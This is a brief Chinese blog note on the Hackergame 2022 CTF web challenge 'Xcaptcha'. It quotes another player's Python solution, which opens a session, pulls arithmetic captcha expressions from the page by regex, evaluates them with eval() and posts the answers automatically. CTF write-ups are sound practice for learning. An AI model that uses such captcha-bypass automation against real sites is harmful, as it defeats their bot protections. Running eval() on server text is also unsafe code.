# Web?
>记一次难忘的web(
* 题目来源：Hackergame 2022
> 难忘原因：找到相似题型，写不出来脚本（
* 题目如下：
# Xcaptcha


* 附一篇大佬题解
'''
session = requests.Session()
session.get("http://202.38.93.111:10047" + tok)
resp = session.get("http://202.38.93.111:10047/xcaptcha")
text = resp.text
pattern = re.compile('\\d+\\+\\d+')
eq1, eq2, eq3 = pattern.findall(text)
session.post("http://202.38.93.111:10047/xcaptcha", data={
    "captcha1": str(eval(eq1)), "captcha2": str(eval(eq2)), "captcha3": str(eval(eq3)), 
}).text
'''
